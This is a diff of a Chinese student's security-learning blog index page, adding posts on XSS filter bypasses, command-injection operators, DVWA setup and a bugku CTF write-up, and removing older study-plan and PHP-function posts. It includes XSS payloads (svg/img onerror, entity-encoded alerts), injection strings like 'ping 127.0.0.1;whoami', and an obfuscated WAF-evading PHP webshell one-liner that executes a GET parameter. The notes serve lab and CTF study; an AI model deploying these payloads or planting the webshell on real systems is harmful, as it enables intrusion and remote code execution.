@@ -7,7 +7,199 @@
     error: 'Copy error',
     noSupport: 'The browser does not support'
   }
-} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">103</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">16</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">18</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/27/2020-02-28%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-28日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-27</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-28日目标"><a href="#2020-02-28日目标" class="headerlink" title="2020-02-28日目标"></a>2020-02-28日目标</h2><table>
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">108</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">17</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">18</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/19/XSS/">XSS</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-19</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">web安全漏洞</a></span><div class="content"><h3 id="XSS绕过过滤"><a href="#XSS绕过过滤" class="headerlink" title="XSS绕过过滤"></a>XSS绕过过滤</h3><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>如果过滤()和[]，则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert&#96;1&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="html实体字符及"><a href="#html实体字符及" class="headerlink" title="html实体字符及"></a>html实体字符及<svg/></h4><p>如果过滤()、[]和``</p>
+<p>则可以使用html实体字符代替括号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert &amp;#40; 1 &amp;#41;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;alert &amp;#40; 1 &amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第一个必须要加<svg>标签，第二个可不加（我寻思可能是第一个不在标签里面）。</svg></p>
+<h4 id="闭合注释"><a href="#闭合注释" class="headerlink" title="闭合注释"></a>闭合注释</h4><p>闭合注释</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--   --&gt;</span><br><span class="line">&lt;!--   --!&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="换行过滤"><a href="#换行过滤" class="headerlink" title="换行过滤"></a>换行过滤</h4><p>对于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input &#x3D; input.replace(&#x2F;auto|on.*&#x3D;|&gt;&#x2F;ig, &#39;_&#39;)</span><br><span class="line">  return &#96;&lt;input value&#x3D;1 $&#123;input&#125; type&#x3D;&quot;text&quot;&gt;&#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可使用<strong>换行绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">src&#x3D;1 type&#x3D;image onerror</span><br><span class="line">&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="浏览器兼容性"><a href="#浏览器兼容性" class="headerlink" title="浏览器兼容性"></a>浏览器兼容性</h4><p>对于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripTagsRe &#x3D; &#x2F;&lt;\&#x2F;?[^&gt;]+&gt;&#x2F;gi</span><br><span class="line"></span><br><span class="line">  input &#x3D; input.replace(stripTagsRe, &#39;&#39;)</span><br><span class="line">  return &#96;&lt;article&gt;$&#123;input&#125;&lt;&#x2F;article&gt;&#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可利用浏览器的兼容性直接输入未闭合标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>留一个没有解决的小问题，为什么此题不能用换行绕过？</p>
+<p>我猜是因为const的缘故？</p>
+</blockquote>
+<h4 id="style闭合"><a href="#style闭合" class="headerlink" title="style闭合"></a>style闭合</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (src) &#123;</span><br><span class="line">  src &#x3D; src.replace(&#x2F;&lt;\&#x2F;style&gt;&#x2F;ig, &#39;&#x2F;* \u574F\u4EBA *&#x2F;&#39;)</span><br><span class="line">  return &#96;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      $&#123;src&#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">  &#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我先试了下老书上的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;BODY&#123;background:url(&quot;javascript:alert(1)&quot;)&#125;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
+
+<p>失败了。</p>
+<p>于是</p>
+<ol>
+<li><p>   多一个空格</p>
+</li>
+<li><pre><code>&lt;/style
+&gt;</code></pre><blockquote>
+<p>不知道为啥这里又可以换行了</p>
+</blockquote>
+</li>
+</ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">命令执行/代码执行</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">web安全漏洞</a></span><div class="content"><h2 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
+<li><p><strong>command1 &amp; command2 ：</strong></p>
+<p>不管command1执行成功与否，都会执行command2（将上一个命令的输出作为下一个命令的输入）</p>
+</li>
+<li><p><strong>command1 &amp;&amp; command2 ：</strong></p>
+<p>先执行command1执行成功后才会执行command2</p>
+</li>
+<li><p><strong>command1 | command2 ：</strong></p>
+<p>只执行command2</p>
+</li>
+<li><p><strong>command1 || command2 ：</strong></p>
+<p>command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</p>
+</li>
+</ul>
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ul>
+<li><p>;   前面的执行完执行后面的    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1;whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>|   管道符，显示后面的执行结果  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1|whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>||  当前面的执行出错时执行后面的  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 1||whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&amp;  前面的语句为假则直接执行后面的,前面可真可假           </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1&amp;whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<blockquote>
+<p><strong>常用url编码</strong> ：<br> %20 = 空格<br> %5c = <br> %26 = &amp;<br> %7c = |</p>
+</blockquote>
+<h2 id="代码执行漏洞和命令执行漏洞"><a href="#代码执行漏洞和命令执行漏洞" class="headerlink" title="代码执行漏洞和命令执行漏洞"></a>代码执行漏洞和命令执行漏洞</h2><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>类似ecal(),assert()函数</p>
+<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>类似exec(),system()</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/02/%E5%9C%A8kali-linux%E4%B8%8B%E6%90%AD%E5%BB%BADVWA/">在kali-linux下搭建DVWA</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/linux/">linux</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/">杂七杂八</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/DVWA/">DVWA</a></span><div class="content"><p>因为平台不同有些操作也有区别，所以今天想要在kali-linux搭建一下DVWA平台，当然还是遇到了一些困难，网上的解决方法也是有好有坏。所以我来总结下：</p>
+<ol>
+<li><p>解压压缩包到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>
+
+<p>并重命名为dvwa</p>
+</li>
+<li><p>将apache2停止：service apache2 stop</p>
+</li>
+<li><p>给dvwa文件夹相应的权限：chmod -R 755 /var/www/html/dvwa</p>
+</li>
+<li><p>启动mysql服务： service mysql start</p>
+</li>
+<li><p>打开mysql： mysql -u root -p</p>
+</li>
+<li><p>创建数据库：create database dvwa;</p>
+</li>
+<li><pre><code>grant all on dvwa.* to dvwa@localhost identified by &apos;password&apos;;
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   这里划重点：dvwa是dvwa_id，password是dvwa_password.</span><br><span class="line"></span><br><span class="line">8.  退出mysql：exit</span><br><span class="line"></span><br><span class="line">9. 启动apache2服务：service apache2 start</span><br><span class="line"></span><br><span class="line">10.</span><br></pre></td></tr></table></figure>
+ cd /var/www/html/dvwa/config/</code></pre></li>
+<li><p>然后打开config.inc.php修改那个user和password（见7）</p>
+</li>
+<li><p>最后打开浏览器访问127.0.0.1/dvwa即可</p>
+</li>
+</ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/01/bugku%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D/">bugku过狗一句话</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-01</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a></span><div class="content"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">送给大家一个过狗一句话</span><br><span class="line">&lt;?php $poc&#x3D;&quot;a#s#s#e#r#t&quot;; $poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先看这段php</p>
+<ul>
+<li><p>explode(‘分割的字符’，被分割的字符串)</p>
+<p>explode函数将原来的字符串以分割字符为界限，分成若干元素计入数组</p>
+</li>
+</ul>
+<p>所以$poc_1=[a,s,s,e,r,t],$poc_2=assert.</p>
+<p>也就是通过get方法获取s元素的值并放入assert执行。</p>
+<blockquote>
+<p>assert（）：把字符串按照php代码来执行。</p>
+</blockquote>
+<p>于是接下来有两种方法：</p>
+<ul>
+<li><strong>s=print_r(scandir(‘./‘)) 然后读取fl4g.txt</strong></li>
+<li><strong>s=print_r(glob(“*.*“)) 然后读取show_source(“fl4g.txt”)</strong></li>
+<li><strong>使用file_get_contents(“flag.txt”)读取文件</strong></li>
+<li><strong>还有system(‘ls’)的读取方法但是这里应该没有权限.</strong></li>
+</ul>
+<p>然而这道题好像除了点问题，咋弄都没反应，希望早日调试好错误。</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/28/2020-02-29%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-29日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-28</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-29日目标"><a href="#2020-02-29日目标" class="headerlink" title="2020-02-29日目标"></a>2020-02-29日目标</h2><table>
+<thead>
+<tr>
+<th>7：00</th>
+<th>起床</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>7：00-8：00</td>
+<td>英语</td>
+</tr>
+<tr>
+<td>8：30-9：30</td>
+<td>sql书</td>
+</tr>
+<tr>
+<td>9：45-11：00</td>
+<td>高数</td>
+</tr>
+<tr>
+<td>11：15-12：00</td>
+<td>JS</td>
+</tr>
+<tr>
+<td>14：00-15：15</td>
+<td>c语言</td>
+</tr>
+<tr>
+<td>15：30-16：15</td>
+<td>物理</td>
+</tr>
+<tr>
+<td>16：30-17：30</td>
+<td>JS</td>
+</tr>
+<tr>
+<td>19：00-20：00</td>
+<td>keep</td>
+</tr>
+<tr>
+<td>21：00-</td>
+<td>刷刷题</td>
+</tr>
+<tr>
+<td>24：00</td>
+<td>睡觉</td>
+</tr>
+</tbody></table>
+<h2 id="2020-02-28总结"><a href="#2020-02-28总结" class="headerlink" title="2020-02-28总结"></a>2020-02-28总结</h2><ol>
+<li>看完了JS第二章第三章</li>
+<li>看了b站c语言p3-p7</li>
+<li>sql第三章</li>
+<li>keep腰腹减脂+跑步机20min</li>
+<li>看家里的网有点慢，就重置了哈路由器，这玩意还有点复杂，一堆乱七八糟的密码，不过还是弄好啦（感觉上快了不少）。</li>
+</ol>
+<p>今天起晚了，加上下午看指针进入了状态所以就多看了一点，有些东西没有完成，明天加油（明天吃火锅）。</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/27/2020-02-28%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-28日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-27</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-28日目标"><a href="#2020-02-28日目标" class="headerlink" title="2020-02-28日目标"></a>2020-02-28日目标</h2><table>
 <thead>
 <tr>
 <th>7：00</th>
@@ -255,237 +447,6 @@
 <li>看了sql第二节</li>
 <li>看了c语言指针第三节</li>
 </ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/22/php%E6%9F%A5%E8%AF%A2%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/">php查询函数整理</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-22</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/php-%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/">php 函数整理</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E5%87%BD%E6%95%B0/">函数</a></span><div class="content"><h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(string,start,length)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>string:被搜索的字符串【必须】</li>
-<li>start:(数字)开始的位置 【必须】</li>
-<li>length:搜索的长度【可选】</li>
-</ul>
-<p>返回字符串的提取部分，如果失败则返回 FALSE，或者返回一个空字符串。</p>
-<p><a href="http://albatross-g.site/2020/02/01/php-substr-%E5%87%BD%E6%95%B0-%E8%BF%94%E5%9B%9E%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86/#%E8%AF%AD%E6%B3%95" target="_blank" rel="noopener">详细</a></p>
-<h3 id="stristr-不区分大小写"><a href="#stristr-不区分大小写" class="headerlink" title="stristr(不区分大小写)"></a>stristr(不区分大小写)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stristr(string,search,before_search)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>string:被搜索的字符串【必须】</li>
-<li>search:所搜索的字符串【必须】</li>
-<li>before_search:设置布尔值：true则返回搜索前的字符串（以搜索的第一个字符为准）【可选】</li>
-</ul>
-<p>返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE。</p>
-<blockquote>
-<p>要区分大小写用 ： strstr()</p>
-</blockquote>
-<h3 id="str-replace（区分大小写）"><a href="#str-replace（区分大小写）" class="headerlink" title="str_replace（区分大小写）"></a>str_replace（区分大小写）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_replace(find,replace,string,count)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>find：所搜索的值【必须】</li>
-<li>replace：替换的值【必须】</li>
-<li>string：被搜索的值【必须】</li>
-<li>count：对替换的值进行计数【可选】</li>
-</ul>
-<p>返回带有替换值的字符串或数组。</p>
-<blockquote>
-<p>如要对大小写不敏感则用 ：str_ireplace（）</p>
-</blockquote>
-<h3 id="stripos（不区分大小写）"><a href="#stripos（不区分大小写）" class="headerlink" title="stripos（不区分大小写）"></a>stripos（不区分大小写）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stripos(string,find,start)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>string:被搜索的字符串【必须】</li>
-<li>start:(数字)开始的位置 【必须】</li>
-<li>start:规定开始搜索的位置【可选】</li>
-</ul>
-<p>返回字符串在另一字符串中<strong>第一次</strong>出现的位置，如果没有找到字符串则返回 FALSE。<strong>注释：</strong>字符串位置从 0 开始，不是从 1 开始。</p>
-<ul>
-<li><a href="https://www.runoob.com/php/func-string-strripos.html" target="_blank" rel="noopener">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li>
-<li><a href="https://www.runoob.com/php/func-string-strpos.html" target="_blank" rel="noopener">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li>
-<li><a href="https://www.runoob.com/php/func-string-strrpos.html" target="_blank" rel="noopener">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li>
-</ul>
-<p>以strpos为底，不区分大小写加i，最后一次出现加r</p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/22/2020-02-23%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-23日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-22</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-23日目标"><a href="#2020-02-23日目标" class="headerlink" title="2020-02-23日目标"></a>2020-02-23日目标</h2><table>
-<thead>
-<tr>
-<th>7：30</th>
-<th>起床</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>8：00-9：00</td>
-<td>英语</td>
-</tr>
-<tr>
-<td>9：30-10：45</td>
-<td>DVWA Weak Session IDs</td>
-</tr>
-<tr>
-<td>11：00-12：00</td>
-<td>sql书</td>
-</tr>
-<tr>
-<td>14：00-15：30</td>
-<td>c语言</td>
-</tr>
-<tr>
-<td>15：45-17：00</td>
-<td>DVWA (CSP) Bypass</td>
-</tr>
-<tr>
-<td>19：00-20：00</td>
-<td>数学</td>
-</tr>
-<tr>
-<td>20：15-21：30</td>
-<td>刷题</td>
-</tr>
-<tr>
-<td></td>
-<td>睡觉</td>
-</tr>
-</tbody></table>
-<h2 id="2020-02-22总结"><a href="#2020-02-22总结" class="headerlink" title="2020-02-22总结"></a>2020-02-22总结</h2><ol>
-<li>了解了DVWA upload的方法，可是中国菜刀怎么都连不上，心态有点崩</li>
-<li>整理了php查询函数</li>
-<li>预习了高数第一单元第一节</li>
-<li>Dvwa insecure  CAPTCHA</li>
-<li>看了教学视频，大致了解了c语言指针</li>
-<li>读了sql第二章第一部分</li>
-<li></li>
-</ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/21/2020-02-22%E6%97%A5%E7%9B%AE%E6%A0%87/">2020-02-22日目标</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-21</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%97%A5%E7%9B%AE%E6%A0%87/">日目标</a></span><div class="content"><h2 id="2020-02-22日目标"><a href="#2020-02-22日目标" class="headerlink" title="2020-02-22日目标"></a>2020-02-22日目标</h2><table>
-<thead>
-<tr>
-<th>7：30</th>
-<th>起床</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>8：00-9：00</td>
-<td>英语</td>
-</tr>
-<tr>
-<td>9：30-10：30</td>
-<td>file upload</td>
-</tr>
-<tr>
-<td>10：45-12：00</td>
-<td>预习高数</td>
-</tr>
-<tr>
-<td>14：00-15：15</td>
-<td>Insecure CAPTCHA</td>
-</tr>
-<tr>
-<td>15：30-17：00</td>
-<td>C语言指针</td>
-</tr>
-<tr>
-<td>19：00-20：00</td>
-<td>sql书</td>
-</tr>
-<tr>
-<td>20：15-…</td>
-<td>刷刷题，整理整理</td>
-</tr>
-<tr>
-<td>24：00</td>
-<td>上床</td>
-</tr>
-</tbody></table>
-<h2 id="2020-02-21总结"><a href="#2020-02-21总结" class="headerlink" title="2020-02-21总结"></a>2020-02-21总结</h2><ol>
-<li>浏览了sql的第一单元</li>
-<li>完成了DVWA file inclusion</li>
-<li>下了个DEV-C++（我比较菜暂时用不惯vs2017）</li>
-<li>看了了解了c语言指针</li>
-<li>做了DVWA file upload部分</li>
-</ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/20/bugku%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/">bugku管理员系统</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-20</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/http/">http</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%8A%93%E5%8C%85/">抓包</a></span><div class="content"><p>任意输入用户名密码：</p>
-<p><img src="/2020/02/20/bugku%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F/7.png" alt="7"></p>
-<p>想到伪造IP地址的http头：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP </p>
-</blockquote>
-<p>改一下头，然后在源代码找到个base64一解密是管理员的密码</p>
-<p>成功。</p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/02/20/%E7%94%A8%E8%84%9A%E6%9C%AC%E7%A0%B4%E8%A7%A3dvwa%E7%9A%84brute%E2%80%94-force/">用脚本破解dvwa的brute—-force</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-20</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctf/">ctf</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/DVWA/">DVWA</a></span><div class="content"><p>先来看看源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 